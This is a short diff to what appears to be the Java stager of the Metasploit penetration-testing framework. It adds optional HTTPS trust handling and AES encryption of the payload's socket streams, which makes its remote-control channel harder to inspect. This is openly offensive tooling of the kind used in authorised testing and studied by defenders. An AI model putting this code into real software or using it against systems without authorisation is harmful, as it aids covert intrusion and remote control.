@@ -105,6 +105,12 @@ public class Payload extends ClassLoader {
 			classFile.getParentFile().mkdirs();
 			// load ourselves via the class loader (works both on disk and from Jar)
 			writeEmbeddedFile(clazz, clazzFile, classFile);
+			if(props.getProperty("URL", "").startsWith("https:")) {
+				writeEmbeddedFile(clazz, "metasploit/PayloadTrustManager.class", new File(classFile.getParentFile(), "PayloadTrustManager.class"));
+			}
+			if (props.getProperty("AESPassword", null) != null) {
+				writeEmbeddedFile(clazz, "metasploit/AESEncryption.class", new File(classFile.getParentFile(), "AESEncryption.class"));
+			}
 			FileOutputStream fos = new FileOutputStream(propFile);
 			props.store(fos, "");
 			fos.close();
@@ -202,6 +208,15 @@ public class Payload extends ClassLoader {
 				}
 				in = socket.getInputStream();
 				out = socket.getOutputStream();
+			}
+			
+			String aesPassword = props.getProperty("AESPassword", null);
+			if (aesPassword != null) {
+				// load the crypto code via reflection, to avoid loading
+				// it when it is not needed (it requires Sun Java 1.4+ or JCE)
+				Object[] streams = (Object[])Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", new Class[] {InputStream.class, OutputStream.class, String.class}).invoke(null, new Object[] {in, out, aesPassword});
+				in = (InputStream) streams[0];
+				out = (OutputStream) streams[1];
 			}
 			
 			// build the stage parameters, if any
